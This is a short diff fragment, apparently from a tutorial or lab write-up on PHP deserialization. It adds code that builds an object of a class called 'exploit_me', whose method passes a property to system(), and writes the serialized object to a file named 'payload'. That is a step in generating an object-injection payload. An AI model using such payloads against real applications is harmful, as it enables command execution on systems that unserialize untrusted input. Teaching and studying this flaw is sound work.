@@ -48,6 +48,9 @@ class exploit_me
         system($this->cmd);
     }
 }
+
+$a = new exploit_me();
+file_put_contents("payload", serialize($a));
 ```
 
 
